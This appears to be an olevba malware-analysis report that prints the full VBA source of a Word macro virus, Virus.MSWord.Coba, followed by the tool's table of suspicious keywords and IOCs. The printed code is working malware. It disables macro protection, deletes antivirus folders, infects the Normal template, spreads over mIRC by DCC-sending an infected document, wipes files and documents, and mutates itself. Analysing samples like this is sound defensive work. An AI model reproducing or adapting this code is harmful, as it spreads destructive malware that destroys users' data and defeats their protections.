olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Coba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Coba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO init.bas 
in file: Virus.MSWord.Coba - OLE stream: 'Macros/VBA/init'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    Rem 31.63511    9.004702    17.51385    167.7657    16.78434
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub init()
On Error Resume Next
ActiveDocument.ReadOnlyRecommended = False
If NormalTemplate.VBProject.VBComponents.Item("init").Name <> "init" Then
ActiveDocument.VBProject.VBComponents("init").Export ("C:\Windows\init.drv")
SetAttr "C:\Windows\init.drv", 6
    Rem 16.26751    34.38096    51.16499    199.1999    57.80993
End If
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DAT") = "Just for FUN by FÖV"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DATFile") = "No need Anti Virus"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\virusscan", "DAT") = "Don't Underestimate Me"
With Application
.EnableCancelKey = wdCancelDisabled
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
    Rem 30.85721    62.50368    155.332 175.3116    1.335123
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If (Second(Now()) > 50) Then
    installed = Dir("C:\mirc\mirc32.exe")
    If installed = "" Then
    Exit Sub
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Else
    reproduce = Dir("C:\mirc\download\IRC-Rules.doc")
    If reproduce = "" Then ActiveDocument.SaveAs "c:\mirc\download\IRC-Rules.doc"
    Kill "C:\mirc\script.ini"
    Open "C:\mirc\script.ini" For Output As #1
    Print #1, "[script]"
    Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick C:\mirc\download\IRC-Rules.doc }"
    Print #1, "n1=on 1:CONNECT: {"
    Print #1, "n2=  /join #virus "
    Print #1, "n3=  /msg #virii by FÖV"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n4= /part #virus"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n5= /clear"
    Print #1, "n6= /motd"
    Print #1, "n7= }"
    Close #1
    End If
End If
JsLw = Int(Rnd * 100)
    If JsLw = 99 Then MsgBox "SkRiPsI is SuCK", vbSystemModal
If Month(Now()) = 1 Or 2 Or 3 Or 4 Or 5 Or 6 Or 12 Then Call Hapus
If Month(Now()) = 11 And Day(Now()) = 5 Then MsgBox "Happynes to all of you", vbInformation, "Birthday Greeting!!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "init") = "C:\Windows\System\init.vbs"
Open "C:\Windows\System\init.vbs" For Output As #1
         Print #1, "On Error Resume Next"
         Print #1, "' init.vbs by FÖV DJ"
         Print #1, "Set WordObj = CreateObject(""Word.Application"")"
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(""init"")"
         Print #1, "WordObj.NormalTemplate.save"
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (""C:\Windows\init.drv"")"
         Print #1, "WordObj.NormalTemplate.save"
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
         Print #1, "WordObj.Quit"
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    Close #1
If ActiveDocument.VBProject.VBComponents.Item("init").Name <> "init" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\init.drv")
    ActiveDocument.Save
    End If
If ActiveDocument.VBProject.VBComponents.Item("init").Name = "init" Then If NormalTemplate.Saved = False Then NormalTemplate.Save
BxUiSjEj:
Call Polymorphic
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
End Sub
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
Sub HelpAbout()
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 34.24832    58.30391    44.8448 58.66183    48.95829
    On Error Resume Next
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Msg = "Peace Words" & Chr(13) & Chr(10)
    Msg = Msg & "Welcome to my world" & Chr(13) & Chr(10)
    Msg = Msg & "Please enjoy your time" & Chr(13) & Chr(10)
    Msg = Msg & "BEFORE YOUR DIE"
    MsgBox Msg, 64, "Microsoft Word"
End Sub
Sub FileNew()
    On Error Resume Next
    Call KillAV
    Call init
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call init
    Call Polymorphic
    Rem 28.86776    69.04005    9.09577 124.4162    27.65331
End Sub
Sub FileSave()
    On Error Resume Next
    Rem 15.93158    82.74393    107.3962    131.8048    25.27892
    Call KillAV
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Call init
    Call Polymorphic
    ActiveDocument.Save
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
End Sub
    Rem 15.3054 14.43974    27.67967    135.7833    24.19432
Sub FileClose()
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    On Error Resume Next
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 39.20018    29.35856    107.6404    43.58784    10.9748
    Call KillAV
    Call init
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Polymorphic
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call KillAV
    Call init
    Call Polymorphic
    Rem 19.441  36.43507    45.85437    11.67463    14.38686
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
End Sub
Sub FileExit()
    Rem 14.14972    56.58767    92.15194    32.82346    55.37416
    On Error Resume Next
    Call KillAV
    Call init
    Call Polymorphic
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Welcome"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "FÖV"
    Msg = "Please Turn-off your computer" & Chr(13) & Chr(10)
    Msg = Msg & "Don't Click bellow"
    MsgBox Msg, 16, "Microsoft Word"
    Kill "C:\windows\command\*.*"
    Kill "C:*.*"
    Kill "C:\progra~1\*.*"
    Msg = "You aren't obey my order" & Chr(13) & Chr(10)
    Msg = Msg & "May the God Bless You"
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    MsgBox Msg, 64, "FÖV"
    Rem 31.87352    26.06062    51.33116    162.6954    0.8270409
Finish:
    Rem 50.38902    38.7235 115.2511    105.5153    30.31051
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call KillAV
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Call init
    Call Polymorphic
End Sub
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
Sub AutoExit()
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    On Error Resume Next
    Rem 4.439305    41.21743    153.9741    54.88734    46.32752
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    SetAttr "C:\Autoexec.bat", 0
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "ECHO OFF"
    Print #1, "CLS"
    Print #1, "ECHO                ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"
    Print #1, "ECHO                º  *****************************************  º"
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "ECHO                º  *               FÖV DJ                  *  º"
    Print #1, "ECHO                º  *****************************************  º"
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Print #1, "ECHO                º  FÖV DJ wishes to thank the user            º"
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "ECHO                º  of this computer because you have          º"
    Print #1, "ECHO                º  helped to spread the good words of peace!  º"
    Print #1, "ECHO                º               ## FÖV DJ ##                  º"
    Print #1, "ECHO                ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½"
    Print #1, "CLS"
    Close #1
    Call KillAV
    Rem 27.8348 35.14243    18.25381    164.639 27.11881
    Call init
    Call Polymorphic
End Sub
Sub AutoExec()
    On Error Resume Next
    Call KillAV
    Call init
    Call Polymorphic
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
End Sub
Sub ToolsMacro()
    Beep
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Call Pesan1
    Call Polymorphic
    On Error Resume Next
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    StatusBar = "    Warning you enter the forbiden zone !!!"
    Application.Caption = "FÖV"
    Application.Username = "DJ"
    Counter = 0
    Do Until Counter = 15
       Counter = Counter + 1
    mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
    Loop
    Call Pesan2
End Sub
Sub ToolsOptions()
    Rem 32.7852 74.94572    3.18892 44.17741    4.363246
    On Error Resume Next
    Rem 44.79695    63.81341    7.709969    86.94687    50.89454
    Beep
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Call Polymorphic
    Rem 20.54449    86.57578    148.1458    11.80974    56.02384
End Sub
Sub FileTemplates()
    Beep
    Call Polymorphic
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    On Error Resume Next
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
End Sub
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
Sub ViewVBCode()
    Beep
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 32.40396    88.74838    154.8639    47.64186    41.01181
    Call Polymorphic
    On Error Resume Next
End Sub
Sub Hapus()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
End Sub
Sub Pesan1()
    On Error Resume Next
    Msg = "Macro Function is not active" & Chr(13) & Chr(10)
    Msg = Msg & "Never use IT"
    MsgBox Msg, 16, "Microsoft Word"
End Sub
Sub Pesan2()
    On Error Resume Next
    Msg = "Did you enjoy your time ?" & Chr(13) & Chr(10)
    Msg = Msg & "Don't do it again OK!"
    MsgBox Msg, 16, "Microsoft Word"
End Sub
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
Sub Polymorphic()
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("init").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 55: b = Rnd * 90: c = Rnd * 170: d = Rnd * 210: e = Rnd * 59
Application.VBE.ActiveVBProject.VBComponents("init").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub
Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Program Files\Quick Heal\*.*"
    Rem 3.350394    35.12623    62.04922    102.8779    9.184121
    Rem 13.41622    48.04858    18.08284    209.8771    39.89438
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |init.vbs            |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

